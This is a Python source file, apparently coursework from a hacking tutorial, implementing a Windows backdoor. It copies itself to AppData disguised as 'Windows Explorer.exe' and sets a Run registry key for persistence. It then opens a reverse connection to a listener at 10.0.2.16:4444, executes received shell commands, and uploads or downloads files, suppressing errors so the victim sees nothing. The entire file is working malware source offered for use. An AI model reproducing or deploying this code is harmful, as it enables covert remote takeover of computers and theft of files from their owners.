#!/usr/bin/env python
#download functionality added so file of target can be downloaded in hacker running command in hacker
#file is series of char so to transfer file we should read the file as seq of char,send this seq of char,create new empty file at destination,store the transferred seq of char in new file
#this method used to transfer file betwn two sys using socket and py
import socket,subprocess,json,os,base64
import sys#to exit program without showing warninr or error message use sys to exit 
import shutil#to copy(past/put) stuff in python
class Backdoor:
    def __init__(self,ip,port):
        self.become_persistence()
        self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
        self.connection.connect((ip,port))
    def become_persistence(self):
        evil_file_location=os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable,evil_file_location)#first arg is source file ,current file we are running from sice it is exe so sys.executable.if it was py file use(replace with)__file__
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\run /v test /t REG_SZ /d "' + evil_file_location + '"',shell=True)
    def reliable_send(self,data):#use instead of socket send method for everytime we need to send data 
        json_data=json.dumps(data)#convert to json
        self.connection.send(json_data)   
    def reliable_receive(self):#best implementation look serialisation once.value error is due to receiving and unpacking incomplete data
        json_data=""
        while True:
            try:
                json_data=json_data + self.connection.recv(1024)
                return json.loads(json_data) 
            except ValueError:
                continue            
    def execute_system_command(self,command):
        # DEVNULL=open(os.devnull,'wb')#for py 2.7 and remove subprocess of below line
        return subprocess.check_output(command,shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
    def change_working_directory_to(self,path):
        os.chdir(path)
        return "[+] changing working direectory to " + path
    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())   
    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Successfully uploaded file"             
    def run(self):
        while True:
            command=self.reliable_receive() #we receive data in form of list and it will execute command without converting to string because check_output of subprocess execute both string as well as list data
            try:
                if command[0]=="exit":
                    self.connection.close()
                    sys.exit()
                elif command[0]=="cd" and len(command) > 1:
                    command_result=self.change_working_directory_to(command[1]) 
                elif command[0]=="download":
                    command_result=self.read_file(command[1])   
                elif command[0]=="upload":
                    command_result=self.write_file(command[1],command[2])      
                else:      
                    command_result=self.execute_system_command(command) 
            except Exception:
                command_result="[-] error during your command execution"        
            self.reliable_send(command_result)
        # self.connection.close()#no need as there is exit()

try:#this try catch for when listner not listening and backdoor is persistance(execute when sys boot automatically) because error box appear at target if not listening.
    backdoor_instance=Backdoor("10.0.2.16",4444)
    backdoor_instance.run()
except Exception:
    sys.exit()            


# execute this in target
# at same time execute listener1_class.py in hacker
